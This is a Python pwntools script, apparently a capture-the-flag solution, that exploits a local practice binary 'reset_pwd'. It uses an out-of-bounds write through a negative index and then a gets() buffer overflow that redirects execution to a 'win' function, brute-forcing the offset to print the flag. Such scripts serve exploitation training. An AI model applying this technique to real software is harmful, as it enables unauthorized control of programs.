from pwn import p32, process, ELF


def get_win_addr(binary_path: str) -> int:
    elf = ELF(binary_path)
    return elf.symbols["win"]


def enter_pin_sequence(io) -> None:
    # Remplit les bons PINs pour passer le check()
    io.sendline(b"i")
    io.sendline(b"-1 1")  # admin_code = 1
    # Répondre à la boucle : insérer les bons digits
    for i, d in enumerate([1, 2, 3, 4]):
        io.sendline(b"i")
        io.sendline(f"{i} {d}".encode())
    # Envoie le code PIN
    io.sendline(b"c")


def trigger_overflow(binary_path: str, win_addr: int) -> str:
    for offset in range(100):
        io = process(binary_path)
        enter_pin_sequence(io)

        # Payload pour overflow sur le retour après gets(name)
        payload = b"A" * (32 + offset) + p32(win_addr)
        io.sendline(payload)

        # Cherche la sortie contenant le flag
        output = io.recvall(timeout=1)
        if b"Please, here is your password:" in output:
            flag = output.decode().split("\n")[-1]
            return flag

    raise ValueError("Flag non trouvé.")


if __name__ == "__main__":
    binary_path = "./reset_pwd"
    win_addr = get_win_addr(binary_path)
    flag = trigger_overflow(binary_path, win_addr=win_addr)
    print(f"Flag: {flag}")
